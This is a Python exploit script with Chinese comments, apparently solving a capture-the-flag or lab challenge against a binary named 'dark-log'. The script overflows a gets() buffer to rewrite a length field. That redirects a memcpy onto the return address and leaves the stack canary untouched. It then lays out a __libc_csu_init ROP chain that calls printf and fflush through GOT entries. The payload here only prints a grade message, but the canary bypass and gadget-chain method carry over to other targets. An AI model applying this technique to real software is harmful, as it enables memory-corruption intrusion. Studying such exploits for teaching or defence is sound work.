import sys

POP6       = 0x40189A     # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
CALL_CHAIN = 0x401880     # mov rdx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]
GOT_PRINTF = 0x602028     # GOT[printf]
GOT_FFLUSH = 0x602038     # GOT[fflush]
FMT        = 0x4018C8     # grade_eval 内部使用的同一个格式串

# ============================ 攻击原理 ============================
# 1) dark-log 开启了 Stack Protector，canary 放在 rbp-8。
#    常规思路是"猜 canary 或泄露它"，但这里有个更省事的入口：
#    input() 里 memcpy(f.logMsg + f.len, f.expression, 128) 的 f.len
#    可以被 gets 溢出改写。
#
# 2) gets 只写到偏移 256（f.len 所在处），偏移 280 的 canary 完全没被
#    触碰 —— 所以函数末尾的 canary 校验必然通过。这不是"猜对 canary"，
#    而是让 canary 根本没被冒犯。
#
# 3) 把 f.len 设成 0xA8：memcpy 目标 = f.logMsg + 0xA8 = rbp + 8，
#    正好是 input 的返回地址，一次搬过去 128 字节的 ROP 链。
#
# 4) dark-log 里没有 pop rdi，无法用立即数直接塞第一个参数。
#    于是改用 __libc_csu_init 的通用链：
#      pop 链装载 r12/r13/r14/r15，
#      再由 "mov edx,r15; mov rsi,r14; mov edi,r13d; call [r12+rbx*8]" 传递
#      三个整型参数并间接调用。
#    参数只能走 32 位立即数，所以 r13 装格式串地址、r14 装字符 'A'，
#    与 grade_eval(4) 内部的 printf(fmt, 'A') 完全等价。
#
# 5) 末尾用 fflush(NULL) 强制刷 stdio 缓冲，防止后续崩溃把输出一起吞掉。
# =================================================================

# ---- 第一轮：printf("\n\033[31m Hope %c will be your grade! \n", 'A') ----
c  = POP6.to_bytes(8, "little")          # +0   返回地址 -> pop 链
c += (0).to_bytes(8, "little")           # +8   rbx = 0
c += (1).to_bytes(8, "little")           # +16  rbp = 1（让 csu 循环退出）
c += GOT_PRINTF.to_bytes(8, "little")    # +24  r12 = &GOT[printf]
c += FMT.to_bytes(8, "little")           # +32  r13 = 格式串 -> edi
c += (0x41).to_bytes(8, "little")        # +40  r14 = 'A'   -> esi
c += (0).to_bytes(8, "little")           # +48  r15 = 0
c += CALL_CHAIN.to_bytes(8, "little")    # +56  call printf(fmt, 'A')

c += (0).to_bytes(8, "little")           # +64  被 "add rsp,8" 吃掉

# ---- 第二轮：fflush(NULL)，把缓冲全部刷出去 ----
c += (0).to_bytes(8, "little")           # +72  rbx = 0
c += (1).to_bytes(8, "little")           # +80  rbp = 1
c += GOT_FFLUSH.to_bytes(8, "little")    # +88  r12 = &GOT[fflush]
c += (0).to_bytes(8, "little")           # +96  r13 = 0 -> edi = NULL
c += (0).to_bytes(8, "little")           # +104 r14
c += (0).to_bytes(8, "little")           # +112 r15
c += CALL_CHAIN.to_bytes(8, "little")    # +120 call fflush(NULL)
assert len(c) == 128, len(c)

p  = c
p += b"A" * (256 - len(p))               # 填满 expression / logMsg 区域
p += (0xA8).to_bytes(4, "little")        # f.len = 0xA8 -> memcpy 目标 = rbp+8
p += b"\n"

sys.stdout.buffer.write(p)
